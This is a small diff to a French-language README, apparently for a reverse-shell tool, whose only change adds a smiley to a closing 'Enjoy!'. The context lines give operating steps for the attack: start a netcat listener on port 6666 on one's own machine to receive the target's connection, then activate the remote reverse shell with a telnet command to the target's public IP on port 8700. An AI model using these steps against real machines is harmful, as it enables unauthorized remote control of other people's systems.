@@ -9,4 +9,5 @@
 3) Exécuter le listener sur votre machine: 'nc -l -p 6666' pour écouter la future connexion de la machine cible.              
 4) Lancer la commande d'activation du revershell distant: 'telnet $ip_publique_machine $port' (à remplacer par le port défini dans le script --> 8700 dans notre cas).
 
-Enjoy!
+
+Enjoy! :)
